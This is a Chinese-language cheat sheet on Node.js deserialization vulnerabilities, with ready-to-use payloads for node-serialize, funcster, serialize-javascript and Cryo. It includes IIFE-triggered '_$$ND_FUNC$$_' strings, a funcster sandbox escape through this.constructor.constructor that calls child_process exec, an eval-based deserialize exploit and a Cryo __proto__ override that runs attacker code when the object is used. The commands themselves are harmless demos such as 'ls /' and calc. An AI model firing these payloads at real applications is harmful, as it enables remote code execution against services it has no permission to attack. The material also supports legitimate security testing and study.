# Node反序列化漏洞

检测

+ node-serialize
+ serialize-to-js
+ funcster

## Node序列化

生成序列化的Payload
```
var y = {
    rce : function(){
        require('child_process').exec('ls /', function(error,
        stdout, stderr) { console.log(stdout) });
    },
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

添加()强制执行
```
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}()"}
```

## funcster

```
{"rce":{"__js_function":"function(){CMD=\"cmd /c calc\";const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').exec(CMD,function(error,stdout,stderr){console.log(stdout)});}()"}}
```

funcster 的一个值得注意的方面是标准内置对象的不可访问性； 它们超出了可访问范围。 此限制会阻止执行尝试调用内置对象方法的代码，从而在使用 console.log() 或 require(something) 等命令时导致出现ReferenceError：控制台未定义等异常。

尽管存在此限制，但可以通过特定方法恢复对全局上下文（包括所有标准内置对象）的完全访问。 通过直接利用全局上下文，可以绕过这一限制。 例如，可以使用以下代码片段重新建立访问：
```
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```

## Serialize-javascript

Serialize-javascript 包专为序列化目的而设计，缺乏任何内置的反序列化功能。 用户负责实现自己的反序列化方法。 官方示例建议直接使用 eval 来反序列化序列化数据：
```
function deserialize(serializedJavascript){
  return eval('(' + serializedJavascript + ')');
}
```

如果此函数用于反序列化对象，Payload：
```
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```

## Cryo

它支持函数序列化和对象重建的方括号表示法，但它不容易受到 IIFE 的影响，因为它正确地管理对象（不使用eval&co）。

这是对象序列化和反序列化的代码：
```
cvar Cryo = require('cryo');
var obj = {
testFunc : function() {return 1111;}
};

var frozen = Cryo.stringify(obj);
console.log(frozen)

var hydrated = Cryo.parse(frozen);
console.log(hydrated);
```

序列化的JSON:
```
{"root":"_CRYO_REF_1","references":[{"contents":{},"value":"_CRYO_FUNCTION_function () {return 1111;}"},{"contents":{"testFunc":"_CRYO_REF_0"},"value":"_CRYO_OBJECT_"}]}
```

对于我们的攻击，我们可以使用自定义 __proto__ 创建序列化的 JSON 对象。 我们可以使用我们自己的方法来创建对象的原型，但作为一个小技巧，我们可以为 __proto__ 设置一个不正确的名称（因为我们不想在应用程序中重写对象的原型）并将其序列化
```
var obj = {
    __proto: {
        toString: function() {console.log("defconrussia"); return 1111;},
        valueOf: function() {console.log("defconrussia"); return 2222;}
    }
};
```

所以我们得到序列化对象并将其从 __proto 重命名为 __proto__ ：
```
{"root":"CRYO_REF_3","references":[{"contents":{},"value":"_CRYO_FUNCTION_function () {console.log(\"defconrussia\"); return 1111;}"},{"contents":{},"value":"_CRYO_FUNCTION_function () {return 2222;}"},{"contents":{"toString":"_CRYO_REF_0","valueOf":"_CRYO_REF_1"},"value":"_CRYO_OBJECT"},{"contents":{"proto":"CRYO_REF_2"},"value":"_CRYO_OBJECT"}]}
```

当我们将该 JSON 有效负载发送到应用程序时，Cryo 包会反序列化对象中的有效负载，但也会将对象的原型更改为我们的值。 因此，如果应用程序以某种方式与对象进行交互，例如将其转换为字符串，则将调用原型的方法并执行我们的代码。
